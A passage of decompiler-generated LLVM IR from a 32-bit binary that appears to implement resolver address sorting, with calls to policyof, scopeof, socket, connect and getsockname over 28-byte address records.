  %v13_804bef3 = icmp eq i32 %v3_804bef3, 3
  store i1 %v13_804bef3, i1* %zf.global-to-local, align 1
  %v7_804befb = icmp sgt i32 %v3_804bef3, 3
  br i1 %v7_804befb, label %dec_label_pc_804befd, label %dec_label_pc_804c261

dec_label_pc_804befd:                             ; preds = %dec_label_pc_804bef3
  %tmp295 = urem i8 %tmp120, 16
  %v1_804bf05 = zext i8 %tmp295 to i32
  store i32 %v1_804bf05, i32* %eax.global-to-local, align 4
  %v9_804bf08 = icmp eq i8 %tmp295, 2
  store i1 %v9_804bf08, i1* %zf.global-to-local, align 1
  br i1 %v9_804bf08, label %dec_label_pc_804c261, label %dec_label_pc_804bf0d

dec_label_pc_804bf0d:                             ; preds = %dec_label_pc_804befd
  %v9_804bf0d = icmp eq i8 %tmp295, 3
  store i1 %v9_804bf0d, i1* %zf.global-to-local, align 1
  %v1_804bf10 = zext i1 %v9_804bf0d to i32
  store i32 %v1_804bf10, i32* %eax.global-to-local, align 4
  %v2_804bf16 = select i1 %v9_804bf0d, i32 -3, i32 -4
  %v3_804bf16 = add nsw i32 %v2_804bf16, %v1_804bf10
  store i32 %v3_804bf16, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c261

dec_label_pc_804bf30:                             ; preds = %dec_label_pc_804bee4, %dec_label_pc_804bd89, %dec_label_pc_804bbf4, %dec_label_pc_804bbd7
  %stack_var_-3512.1.off040 = phi i32 [ %v0_804bbff, %dec_label_pc_804bbf4 ], [ %stack_var_-3512.0.ph.in, %dec_label_pc_804bd89 ], [ %v4_804bee4, %dec_label_pc_804bee4 ], [ %v0_804bbe2, %dec_label_pc_804bbd7 ]
  %v5_804bf30 = icmp eq i32 %stack_var_-3512.1.off040, 0
  store i1 %v5_804bf30, i1* %zf.global-to-local, align 1
  %tmp189 = icmp slt i32 %stack_var_-3512.1.off040, 1
  %tmp190 = icmp eq i1 %tmp189, false
  br i1 %tmp190, label %dec_label_pc_804bf4a, label %dec_label_pc_804bf37

dec_label_pc_804bf37:                             ; preds = %dec_label_pc_804bf30
  %v4_804bf35 = icmp eq i1 %v5_804bf30, false
  br i1 %v4_804bf35, label %dec_label_pc_804c261, label %dec_label_pc_804bf3d

dec_label_pc_804bf3d:                             ; preds = %dec_label_pc_804bf37, %dec_label_pc_804bc10
  br label %dec_label_pc_804c261

dec_label_pc_804bf4a:                             ; preds = %dec_label_pc_804bad7, %dec_label_pc_804bb51, %dec_label_pc_804bf30
  %stack_var_-3512.2.off0 = phi i32 [ %stack_var_-3512.1.off040, %dec_label_pc_804bf30 ], [ 1, %dec_label_pc_804bb51 ], [ 1, %dec_label_pc_804bad7 ]
  %v4_804bf4a = and i8 %stack_var_20.0, 8
  %v5_804bf4a = icmp eq i8 %v4_804bf4a, 0
  store i1 %v5_804bf4a, i1* %zf.global-to-local, align 1
  br i1 %v5_804bf4a, label %dec_label_pc_804bff3, label %dec_label_pc_804bf58

dec_label_pc_804bf58:                             ; preds = %dec_label_pc_804bf4a
  store i32 0, i32* @edi, align 4
  %v4_804bf5a = and i8 %stack_var_20.0, 16
  %v5_804bf5a = icmp eq i8 %v4_804bf5a, 0
  store i1 %v5_804bf5a, i1* %zf.global-to-local, align 1
  %v3_804bf70.pre = load i8*, i8** %stack_var_4, align 4
  %v4_804bf70 = ptrtoint i8* %v3_804bf70.pre to i32
  br i1 %v5_804bf5a, label %dec_label_pc_804bf6d, label %dec_label_pc_804bfb0

dec_label_pc_804bf66:                             ; preds = %dec_label_pc_804bf6d
  %v1_804bf66 = add i32 %v0_804bf66, 1
  store i32 %v1_804bf66, i32* @edi, align 4
  %v16_804bf67 = icmp eq i32 %v1_804bf66, %stack_var_-3512.2.off0
  br i1 %v16_804bf67, label %dec_label_pc_804bfb0.loopexit, label %dec_label_pc_804bf6d

dec_label_pc_804bf6d:                             ; preds = %dec_label_pc_804bf58, %dec_label_pc_804bf66
  %v0_804bf66 = phi i32 [ %v1_804bf66, %dec_label_pc_804bf66 ], [ 0, %dec_label_pc_804bf58 ]
  %v3_804bf6d = mul i32 %v0_804bf66, 28
  store i32 %v3_804bf6d, i32* %eax.global-to-local, align 4
  store i32 %v4_804bf70, i32* @ecx, align 4
  %v2_804bf77 = add i32 %v3_804bf6d, %v4_804bf70
  %v3_804bf77 = inttoptr i32 %v2_804bf77 to i32*
  %v4_804bf77 = load i32, i32* %v3_804bf77, align 4
  %v13_804bf77 = icmp eq i32 %v4_804bf77, 10
  %v1_804bf7b = icmp eq i1 %v13_804bf77, false
  br i1 %v1_804bf7b, label %dec_label_pc_804bf66, label %dec_label_pc_804bf7d

dec_label_pc_804bf7d:                             ; preds = %dec_label_pc_804bf6d
  store i32 0, i32* @esi, align 4
  store i32 %v2_804bf77, i32* @ebx, align 4
  %v16_804bfa6237 = icmp eq i32 %v0_804bf66, %stack_var_-3512.2.off0
  store i1 %v16_804bfa6237, i1* %zf.global-to-local, align 1
  %v5_804bfaa239 = icmp slt i32 %v0_804bf66, %stack_var_-3512.2.off0
  br i1 %v5_804bfaa239, label %dec_label_pc_804bf85, label %dec_label_pc_804bfb0

dec_label_pc_804bf85:                             ; preds = %dec_label_pc_804bf7d, %dec_label_pc_804bfa2
  %v0_804bf98241 = phi i32 [ %v1_804bfa3, %dec_label_pc_804bfa2 ], [ %v2_804bf77, %dec_label_pc_804bf7d ]
  %v0_804bfa6240 = phi i32 [ %v1_804bfa2, %dec_label_pc_804bfa2 ], [ %v0_804bf66, %dec_label_pc_804bf7d ]
  %v1_804bf85 = inttoptr i32 %v0_804bf98241 to i32*
  %v2_804bf85 = load i32, i32* %v1_804bf85, align 4
  %v11_804bf85 = icmp eq i32 %v2_804bf85, 10
  store i1 %v11_804bf85, i1* %zf.global-to-local, align 1
  %v1_804bf88 = icmp eq i1 %v11_804bf85, false
  br i1 %v1_804bf88, label %dec_label_pc_804bfa2, label %dec_label_pc_804bf8a

dec_label_pc_804bf8a:                             ; preds = %dec_label_pc_804bf85
  %v1_804bf8a = load i32, i32* @esi, align 4
  %v3_804bf8a = mul i32 %v1_804bf8a, 28
  %v1_804bf8d = add i32 %v1_804bf8a, 1
  store i32 %v1_804bf8d, i32* @esi, align 4
  %v6_804bf8e = add i32 %v3_804bf8a, %v4_804bf70
  %v16_804bf8e = icmp eq i32 %v6_804bf8e, 0
  store i1 %v16_804bf8e, i1* %zf.global-to-local, align 1
  store i32 %v6_804bf8e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 28 to i8*), i8** %stack_var_-3556, align 4
  %v5_804bf99 = inttoptr i32 %v6_804bf8e to i8*
  store i8* %v5_804bf99, i8** %stack_var_-3564, align 4
  %v6_804bf9a = call i32 @memcpy(i8* %v5_804bf99, i32 %v0_804bf98241, i32 28)
  store i32 %v6_804bf9a, i32* %eax.global-to-local, align 4
  %v0_804bf9f = load i32, i32* @esp, align 4
  %v6_804bf9f = icmp eq i32 %v0_804bf9f, -16
  store i1 %v6_804bf9f, i1* %zf.global-to-local, align 1
  %v0_804bfa2.pre = load i32, i32* @edi, align 4
  %v0_804bfa3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bfa2

dec_label_pc_804bfa2:                             ; preds = %dec_label_pc_804bf85, %dec_label_pc_804bf8a
  %v0_804bfa3 = phi i32 [ %v0_804bf98241, %dec_label_pc_804bf85 ], [ %v0_804bfa3.pre, %dec_label_pc_804bf8a ]
  %v0_804bfa2 = phi i32 [ %v0_804bfa6240, %dec_label_pc_804bf85 ], [ %v0_804bfa2.pre, %dec_label_pc_804bf8a ]
  %v1_804bfa2 = add i32 %v0_804bfa2, 1
  store i32 %v1_804bfa2, i32* @edi, align 4
  %v1_804bfa3 = add i32 %v0_804bfa3, 28
  store i32 %v1_804bfa3, i32* @ebx, align 4
  %v16_804bfa6 = icmp eq i32 %v1_804bfa2, %stack_var_-3512.2.off0
  store i1 %v16_804bfa6, i1* %zf.global-to-local, align 1
  %v5_804bfaa = icmp slt i32 %v1_804bfa2, %stack_var_-3512.2.off0
  br i1 %v5_804bfaa, label %dec_label_pc_804bf85, label %dec_label_pc_804bfa6.dec_label_pc_804bfac_crit_edge

dec_label_pc_804bfa6.dec_label_pc_804bfac_crit_edge: ; preds = %dec_label_pc_804bfa2
  %v0_804bfac.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bfb0

dec_label_pc_804bfb0.loopexit:                    ; preds = %dec_label_pc_804bf66
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804bfb0

dec_label_pc_804bfb0:                             ; preds = %dec_label_pc_804bf58, %dec_label_pc_804bf7d, %dec_label_pc_804bfa6.dec_label_pc_804bfac_crit_edge, %dec_label_pc_804bfb0.loopexit
  %stack_var_-3512.3.off0 = phi i32 [ %stack_var_-3512.2.off0, %dec_label_pc_804bfb0.loopexit ], [ %v0_804bfac.pre, %dec_label_pc_804bfa6.dec_label_pc_804bfac_crit_edge ], [ 0, %dec_label_pc_804bf7d ], [ %stack_var_-3512.2.off0, %dec_label_pc_804bf58 ]
  store i32 %v4_804bf70, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v16_804bfed226 = icmp eq i32 %stack_var_-3512.3.off0, 0
  store i1 %v16_804bfed226, i1* %zf.global-to-local, align 1
  %v5_804bff1228 = icmp sgt i32 %stack_var_-3512.3.off0, 0
  br i1 %v5_804bff1228, label %dec_label_pc_804bfbb, label %dec_label_pc_804bff3

dec_label_pc_804bfbb:                             ; preds = %dec_label_pc_804bfb0, %dec_label_pc_804bfe9
  %v0_804bfed230 = phi i32 [ %v1_804bfe9, %dec_label_pc_804bfe9 ], [ 0, %dec_label_pc_804bfb0 ]
  %v0_804bfc3229 = phi i32 [ %v1_804bfea, %dec_label_pc_804bfe9 ], [ %v4_804bf70, %dec_label_pc_804bfb0 ]
  %v1_804bfbb = inttoptr i32 %v0_804bfc3229 to i32*
  %v2_804bfbb = load i32, i32* %v1_804bfbb, align 4
  %v11_804bfbb = icmp eq i32 %v2_804bfbb, 2
  store i1 %v11_804bfbb, i1* %zf.global-to-local, align 1
  %v1_804bfbe = icmp eq i1 %v11_804bfbb, false
  br i1 %v1_804bfbe, label %dec_label_pc_804bfe9, label %dec_label_pc_804bfc0

dec_label_pc_804bfc0:                             ; preds = %dec_label_pc_804bfbb
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-3556, align 4
  %v1_804bfc3 = add i32 %v0_804bfc3229, 8
  store i32 %v1_804bfc3, i32* @ebx, align 4
  %v1_804bfc7 = add i32 %v0_804bfc3229, 20
  store i32 %v1_804bfc7, i32* %eax.global-to-local, align 4
  %v5_804bfca = inttoptr i32 %v1_804bfc7 to i8*
  store i8* %v5_804bfca, i8** %stack_var_-3564, align 4
  %v6_804bfcb = call i32 @memcpy(i8* %v5_804bfca, i32 %v1_804bfc3, i32 4)
  store i32 %v6_804bfcb, i32* %eax.global-to-local, align 4
  %v0_804bfd0 = load i32, i32* @esp, align 4
  %v9_804bfd0 = icmp eq i32 %v0_804bfd0, -12
  store i1 %v9_804bfd0, i1* %zf.global-to-local, align 1
  store i8* inttoptr (i32 12 to i8*), i8** %stack_var_-3556, align 4
  %v0_804bfda = load i32, i32* @ebx, align 4
  %v5_804bfda = inttoptr i32 %v0_804bfda to i8*
  store i8* %v5_804bfda, i8** %stack_var_-3564, align 4
  %v6_804bfdb = call i32 @memcpy(i8* %v5_804bfda, i32 ptrtoint (i32* @global_var_80544d0.351 to i32), i32 12)
  store i32 %v6_804bfdb, i32* %eax.global-to-local, align 4
  %v0_804bfe0 = load i32, i32* @esp, align 4
  %v6_804bfe0 = icmp eq i32 %v0_804bfe0, -16
  store i1 %v6_804bfe0, i1* %zf.global-to-local, align 1
  %v0_804bfe3 = load i32, i32* @edi, align 4
  %v1_804bfe3 = inttoptr i32 %v0_804bfe3 to i32*
  store i32 10, i32* %v1_804bfe3, align 4
  %v0_804bfe9.pre = load i32, i32* @esi, align 4
  %v0_804bfea.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804bfe9

dec_label_pc_804bfe9:                             ; preds = %dec_label_pc_804bfbb, %dec_label_pc_804bfc0
  %v0_804bfea = phi i32 [ %v0_804bfc3229, %dec_label_pc_804bfbb ], [ %v0_804bfea.pre, %dec_label_pc_804bfc0 ]
  %v0_804bfe9 = phi i32 [ %v0_804bfed230, %dec_label_pc_804bfbb ], [ %v0_804bfe9.pre, %dec_label_pc_804bfc0 ]
  %v1_804bfe9 = add i32 %v0_804bfe9, 1
  store i32 %v1_804bfe9, i32* @esi, align 4
  %v1_804bfea = add i32 %v0_804bfea, 28
  store i32 %v1_804bfea, i32* @edi, align 4
  %v16_804bfed = icmp eq i32 %v1_804bfe9, %stack_var_-3512.3.off0
  store i1 %v16_804bfed, i1* %zf.global-to-local, align 1
  %v5_804bff1 = icmp slt i32 %v1_804bfe9, %stack_var_-3512.3.off0
  br i1 %v5_804bff1, label %dec_label_pc_804bfbb, label %dec_label_pc_804bff3

dec_label_pc_804bff3:                             ; preds = %dec_label_pc_804bfb0, %dec_label_pc_804bfe9, %dec_label_pc_804bf4a
  %v0_804c232 = phi i32 [ %stack_var_-3512.2.off0, %dec_label_pc_804bf4a ], [ %stack_var_-3512.3.off0, %dec_label_pc_804bfe9 ], [ %stack_var_-3512.3.off0, %dec_label_pc_804bfb0 ]
  %v10_804bff3 = icmp eq i32 %v0_804c232, 0
  %v14_804bff3 = icmp eq i32 %v0_804c232, 1
  store i1 %v14_804bff3, i1* %zf.global-to-local, align 1
  %v7_804bff8 = icmp sgt i32 %v0_804c232, 1
  br i1 %v7_804bff8, label %dec_label_pc_804bffe, label %dec_label_pc_804c261

dec_label_pc_804bffe:                             ; preds = %dec_label_pc_804bff3
  %v0_804bffe = load i32, i32* @ebp, align 4
  %v9_804bffe = icmp eq i32 %v0_804bffe, 2
  store i1 %v9_804bffe, i1* %zf.global-to-local, align 1
  br i1 %v9_804bffe, label %dec_label_pc_804c261, label %dec_label_pc_804c007

dec_label_pc_804c007:                             ; preds = %dec_label_pc_804bffe
  %v3_804c007 = load i8*, i8** %stack_var_4, align 4
  %v4_804c007 = ptrtoint i8* %v3_804c007 to i32
  store i32 %v4_804c007, i32* %eax.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804c020214 = bitcast i8* %v3_804c007 to i32*
  %v2_804c020215 = load i32, i32* %v1_804c020214, align 4
  %v11_804c020217 = icmp eq i32 %v2_804c020215, 2
  br i1 %v11_804c020217, label %dec_label_pc_804c012, label %dec_label_pc_804c025

dec_label_pc_804c012:                             ; preds = %dec_label_pc_804c007, %dec_label_pc_804c01f
  %v0_804c01f219 = phi i32 [ %v1_804c01f, %dec_label_pc_804c01f ], [ 0, %dec_label_pc_804c007 ]
  %v0_804c020218 = phi i32 [ %v1_804c012, %dec_label_pc_804c01f ], [ %v4_804c007, %dec_label_pc_804c007 ]
  %v1_804c012 = add i32 %v0_804c020218, 28
  store i32 %v1_804c012, i32* %eax.global-to-local, align 4
  %v16_804c015 = icmp eq i32 %v0_804c01f219, %v0_804c232
  br i1 %v16_804c015, label %dec_label_pc_804c261.loopexit, label %dec_label_pc_804c01f

dec_label_pc_804c01f:                             ; preds = %dec_label_pc_804c012
  %v1_804c01f = add i32 %v0_804c01f219, 1
  store i32 %v1_804c01f, i32* %edx.global-to-local, align 4
  %v1_804c020 = inttoptr i32 %v1_804c012 to i32*
  %v2_804c020 = load i32, i32* %v1_804c020, align 4
  %v11_804c020 = icmp eq i32 %v2_804c020, 2
  br i1 %v11_804c020, label %dec_label_pc_804c012, label %dec_label_pc_804c025

dec_label_pc_804c025:                             ; preds = %dec_label_pc_804c01f, %dec_label_pc_804c007
  %v0_804c020.lcssa = phi i32 [ %v4_804c007, %dec_label_pc_804c007 ], [ %v1_804c012, %dec_label_pc_804c01f ]
  store i1 false, i1* %zf.global-to-local, align 1
  %v5_804c025 = inttoptr i32 %v0_804c020.lcssa to i8*
  store i8* %v5_804c025, i8** %stack_var_-3556, align 4
  %v2_804c027 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804c027, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-3564, align 4
  %v4_804c031 = call i32 @__pthread_setcancelstate(i32 1, i32* nonnull %stack_var_-20)
  %v2_804c04c = ptrtoint i32* %stack_var_-124 to i32
  store i32 %v2_804c04c, i32* %edx.global-to-local, align 4
  %v2_804c0a9 = ptrtoint i32* %stack_var_-116 to i32
  %tmp192 = bitcast i32* %stack_var_-116 to i8*
  %v2_804c140 = ptrtoint i32* %stack_var_-96 to i32
  %v2_804c148 = ptrtoint i32* %stack_var_-24 to i32
  %tmp193 = bitcast i32* %stack_var_-24 to i8*
  %v2_804c167 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v0_804c232, i32* @eax, align 4
  store i1 %v10_804bff3, i1* %zf.global-to-local, align 1
  br i1 %v10_804bff3, label %dec_label_pc_804c22b, label %dec_label_pc_804c05c

dec_label_pc_804c05c:                             ; preds = %dec_label_pc_804c025, %dec_label_pc_804c1e3
  %stack_var_-3508.0213 = phi i32 [ %v4_804c209, %dec_label_pc_804c1e3 ], [ 0, %dec_label_pc_804c025 ]
  %stack_var_-3516.0212 = phi i8* [ %v5_804c219, %dec_label_pc_804c1e3 ], [ %v3_804c007, %dec_label_pc_804c025 ]
  %v4_804c05c = ptrtoint i8* %stack_var_-3516.0212 to i32
  store i32 %v4_804c05c, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804c04c, i32* %edi.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v1_804c067 = add i32 %v4_804c05c, 4
  %v2_804c067 = inttoptr i32 %v1_804c067 to i32*
  %v3_804c067 = load i32, i32* %v2_804c067, align 4
  store i32 %v3_804c067, i32* %edx.global-to-local, align 4
  %v1_804c06a = add i32 %v4_804c05c, 8
  store i32 %v1_804c06a, i32* @ebx, align 4
  %v6_804c06d = add i32 %v2_804c04c, 4
  store i32 %v6_804c06d, i32* %edi.global-to-local, align 4
  store i32 10, i32* %stack_var_-124, align 4
  %v2_804c082 = inttoptr i32 %v6_804c06d to i32*
  store i32 0, i32* %v2_804c082, align 4
  %v3_804c082 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c082 = add i32 %v3_804c082, 4
  store i32 %v6_804c082, i32* %edi.global-to-local, align 4
  %v0_804c083 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c083 = inttoptr i32 %v6_804c082 to i32*
  store i32 %v0_804c083, i32* %v2_804c083, align 4
  %v3_804c083 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c083 = add i32 %v3_804c083, 4
  store i32 %v6_804c083, i32* %edi.global-to-local, align 4
  %v0_804c084 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c084 = inttoptr i32 %v6_804c083 to i32*
  store i32 %v0_804c084, i32* %v2_804c084, align 4
  %v3_804c084 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c084 = add i32 %v3_804c084, 4
  store i32 %v6_804c084, i32* %edi.global-to-local, align 4
  %v0_804c085 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c085 = inttoptr i32 %v6_804c084 to i32*
  store i32 %v0_804c085, i32* %v2_804c085, align 4
  %v3_804c085 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c085 = add i32 %v3_804c085, 4
  store i32 %v6_804c085, i32* %edi.global-to-local, align 4
  %v0_804c086 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c086 = inttoptr i32 %v6_804c085 to i32*
  store i32 %v0_804c086, i32* %v2_804c086, align 4
  %v3_804c086 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c086 = add i32 %v3_804c086, 4
  store i32 %v6_804c086, i32* %edi.global-to-local, align 4
  %v0_804c087 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c087 = inttoptr i32 %v6_804c086 to i32*
  store i32 %v0_804c087, i32* %v2_804c087, align 4
  %v3_804c087 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c087 = add i32 %v3_804c087, 4
  store i32 %v6_804c087, i32* @edi, align 4
  %v0_804c08f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c08f = inttoptr i32 %v0_804c08f to i32*
  %v2_804c08f = load i32, i32* %v1_804c08f, align 4
  %v11_804c08f = icmp eq i32 %v2_804c08f, 10
  store i1 %v11_804c08f, i1* %zf.global-to-local, align 1
  %v1_804c092 = icmp eq i1 %v11_804c08f, false
  br i1 %v1_804c092, label %dec_label_pc_804c0a1, label %dec_label_pc_804c0c3

dec_label_pc_804c0a1:                             ; preds = %dec_label_pc_804c05c
  store i8* inttoptr (i32 12 to i8*), i8** %stack_var_-3556, align 4
  store i32 %v2_804c0a9, i32* %edx.global-to-local, align 4
  store i8* %tmp192, i8** %stack_var_-3564, align 4
  %v6_804c0b1 = call i32 @memcpy(i8* %tmp192, i32 ptrtoint (i32* @global_var_80544d0.351 to i32), i32 12)
  store i32 %v6_804c0b1, i32* %eax.global-to-local, align 4
  %v0_804c0b6 = load i32, i32* @esp, align 4
  %v9_804c0b6 = icmp eq i32 %v0_804c0b6, -12
  store i1 %v9_804c0b6, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804c0c3

dec_label_pc_804c0c3:                             ; preds = %dec_label_pc_804c05c, %dec_label_pc_804c0a1
  %storemerge14.in = phi i32* [ %stack_var_-104, %dec_label_pc_804c0a1 ], [ %stack_var_-116, %dec_label_pc_804c05c ]
  %storemerge28 = phi i8* [ inttoptr (i32 4 to i8*), %dec_label_pc_804c0a1 ], [ inttoptr (i32 16 to i8*), %dec_label_pc_804c05c ]
  store i8* %storemerge28, i8** %stack_var_-3556, align 4
  %storemerge26 = load i32, i32* @ebx, align 4
  %storemerge14 = ptrtoint i32* %storemerge14.in to i32
  store i32 %storemerge14, i32* %eax.global-to-local, align 4
  %v5_804c0c3 = bitcast i32* %storemerge14.in to i8*
  store i8* %v5_804c0c3, i8** %stack_var_-3564, align 4
  %v4_804c0c4 = ptrtoint i8* %storemerge28 to i32
  %v6_804c0c4 = call i32 @memcpy(i8* %v5_804c0c3, i32 %storemerge26, i32 %v4_804c0c4)
  %v0_804c0c9 = load i32, i32* @esp, align 4
  %v6_804c0c9 = icmp eq i32 %v0_804c0c9, -16
  store i1 %v6_804c0c9, i1* %zf.global-to-local, align 1
  store i32 %v2_804c0a9, i32* @eax, align 4
  %v0_804c0d3 = call i32 @policyof()
  store i32 %v2_804c0a9, i32* @eax, align 4
  %v0_804c0e1 = call i32 @scopeof()
  store i32 %v0_804c0e1, i32* %eax.global-to-local, align 4
  %v1_804c0ea = add i32 %v0_804c0d3, 19
  %v2_804c0ea = inttoptr i32 %v1_804c0ea to i8*
  %v3_804c0ea = load i8, i8* %v2_804c0ea, align 1
  %v4_804c0ea = zext i8 %v3_804c0ea to i32
  %v5_804c0ea = load i32, i32* @ecx, align 4
  %v6_804c0ea = and i32 %v5_804c0ea, -256
  %v7_804c0ea = or i32 %v6_804c0ea, %v4_804c0ea
  store i32 %v7_804c0ea, i32* %ecx.global-to-local, align 4
  %v1_804c0f1 = add i32 %v0_804c0d3, 18
  %v2_804c0f1 = inttoptr i32 %v1_804c0f1 to i8*
  %v3_804c0f1 = load i8, i8* %v2_804c0f1, align 1
  %v4_804c0f1 = zext i8 %v3_804c0f1 to i32
  %v6_804c0f1 = and i32 %v0_804c0d3, -256
  %v7_804c0f1 = or i32 %v4_804c0f1, %v6_804c0f1
  store i32 %v7_804c0f1, i32* @ebx, align 4
  store i8* inttoptr (i32 17 to i8*), i8** %stack_var_-3556, align 4
  store i8* inttoptr (i32 10 to i8*), i8** %stack_var_-3564, align 4
  %v5_804c102 = call i32 @socket(i32 10, i32 524290, i32 17)
  store i32 %v5_804c102, i32* %eax.global-to-local, align 4
  %v1_804c10a = icmp eq i32 %v5_804c102, 0
  store i1 %v1_804c10a, i1* %zf.global-to-local, align 1
  %v2_804c10a = icmp slt i32 %v5_804c102, 0
  store i32 %v5_804c102, i32* @ebp, align 4
  %v1_804c10e = icmp eq i1 %v2_804c10a, false
  br i1 %v1_804c10e, label %dec_label_pc_804c119, label %dec_label_pc_804c110

dec_label_pc_804c110:                             ; preds = %dec_label_pc_804c0c3
  store i32 0, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804c1e3

dec_label_pc_804c119:                             ; preds = %dec_label_pc_804c0c3
  %v0_804c119 = load i32, i32* @ebx, align 4
  store i8* inttoptr (i32 28 to i8*), i8** %stack_var_-3556, align 4
  store i32 %v2_804c04c, i32* %eax.global-to-local, align 4
  %v5_804c124 = inttoptr i32 %v5_804c102 to i8*
  store i8* %v5_804c124, i8** %stack_var_-3564, align 4
  %v5_804c125 = call i32 @connect(i32 %v2_804c04c, i32 28, i32 %v0_804c119)
  store i32 %v5_804c125, i32* %eax.global-to-local, align 4
  %v1_804c12d = icmp eq i32 %v5_804c125, 0
  store i1 %v1_804c12d, i1* %zf.global-to-local, align 1
  br i1 %v1_804c12d, label %dec_label_pc_804c135, label %dec_label_pc_804c131

dec_label_pc_804c131:                             ; preds = %dec_label_pc_804c119
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804c163

dec_label_pc_804c135:                             ; preds = %dec_label_pc_804c119
  store i32 28, i32* %stack_var_-24, align 4
  store i32 %v2_804c140, i32* %eax.global-to-local, align 4
  %v0_804c147 = load i32, i32* @ecx, align 4
  store i32 %v2_804c148, i32* %edx.global-to-local, align 4
  store i8* %tmp193, i8** %stack_var_-3556, align 4
  %v0_804c151 = load i32, i32* @ebp, align 4
  %v5_804c151 = inttoptr i32 %v0_804c151 to i8*
  store i8* %v5_804c151, i8** %stack_var_-3564, align 4
  %v5_804c152 = call i32 @getsockname(i32 %v2_804c140, i32 %v2_804c148, i32 %v0_804c147)
  store i32 %v5_804c152, i32* %eax.global-to-local, align 4
  %v1_804c15a = icmp eq i32 %v5_804c152, 0
  store i1 %v1_804c15a, i1* %zf.global-to-local, align 1
  br i1 %v1_804c15a, label %dec_label_pc_804c167, label %dec_label_pc_804c163

dec_label_pc_804c163:                             ; preds = %dec_label_pc_804c135, %dec_label_pc_804c131
  %storemerge15 = phi i32 [ 0, %dec_label_pc_804c131 ], [ 1073741824, %dec_label_pc_804c135 ]
  store i32 %storemerge15, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804c1d7

dec_label_pc_804c167:                             ; preds = %dec_label_pc_804c135
  store i32 %v2_804c167, i32* @ebx, align 4
  store i32 %v2_804c167, i32* @eax, align 4
  %v0_804c170 = call i32 @scopeof()
  %v15_804c175 = icmp eq i32 %v0_804c0e1, %v0_804c170
  store i1 %v15_804c175, i1* %zf.global-to-local, align 1
  %v1_804c179 = zext i1 %v15_804c175 to i32
  store i32 %v1_804c179, i32* @esi, align 4
  store i32 %v2_804c167, i32* @eax, align 4
  %v0_804c181 = call i32 @policyof()
  store i32 %v0_804c181, i32* %eax.global-to-local, align 4
  %v0_804c186 = load i32, i32* @esi, align 4
  %v5_804c187 = load i32, i32* @edx, align 4
  %v6_804c187 = and i32 %v5_804c187, -256
  %v7_804c187 = or i32 %v6_804c187, %v4_804c0ea
  store i32 %v7_804c187, i32* %edx.global-to-local, align 4
  %v1_804c18b294 = add i32 %v0_804c186, 1610612735
  %v1_804c191 = and i32 %v1_804c18b294, -536870912
  %v6_804c191 = icmp eq i32 %v1_804c191, 0
  store i1 %v6_804c191, i1* %zf.global-to-local, align 1
  store i32 %v1_804c191, i32* @esi, align 4
  %v1_804c197 = add i32 %v0_804c181, 19
  %v2_804c197 = inttoptr i32 %v1_804c197 to i8*
  %v3_804c197 = load i8, i8* %v2_804c197, align 1
  %v16_804c197 = icmp eq i8 %v3_804c197, %v3_804c0ea
  store i1 %v16_804c197, i1* %zf.global-to-local, align 1
  %v1_804c19a = icmp eq i1 %v16_804c197, false
  br i1 %v1_804c19a, label %dec_label_pc_804c1a2, label %dec_label_pc_804c19c

dec_label_pc_804c19c:                             ; preds = %dec_label_pc_804c167
  %v1_804c19c = or i32 %v1_804c191, 268435456
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %v1_804c19c, i32* @esi, align 4
  br label %dec_label_pc_804c1a2

dec_label_pc_804c1a2:                             ; preds = %dec_label_pc_804c167, %dec_label_pc_804c19c
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  %v0_804c1b9.pre = load i32, i32* @esp, align 4
  %v2_804c1b9 = add i32 %v0_804c1b9.pre, 3460
  %v4_804c1c5 = add i32 %v0_804c1b9.pre, 3432
  br label %dec_label_pc_804c1af

dec_label_pc_804c1a6:                             ; preds = %bb194
  %v1_804c1a6 = add nuw nsw i32 %v0_804c1a6, 1
  store i32 %v1_804c1a6, i32* @edi, align 4
  %v6_804c1a7 = icmp eq i32 %v0_804c1a6, 127
  store i1 %v6_804c1a7, i1* %zf.global-to-local, align 1
  br i1 %v6_804c1a7, label %dec_label_pc_804c1d7, label %dec_label_pc_804c1af

dec_label_pc_804c1af:                             ; preds = %dec_label_pc_804c1a6, %dec_label_pc_804c1a2
  %v7_804c1b9 = phi i32 [ %v14_804c1c5, %dec_label_pc_804c1a6 ], [ %v0_804c181, %dec_label_pc_804c1a2 ]
  %v0_804c1a6 = phi i32 [ %v1_804c1a6, %dec_label_pc_804c1a6 ], [ 0, %dec_label_pc_804c1a2 ]
  %v2_804c1b3 = udiv i32 %v0_804c1a6, 8
  %v1_804c1b6 = urem i32 %v0_804c1a6, 8
  %v2_804c1b6 = icmp eq i32 %v1_804c1b6, 0
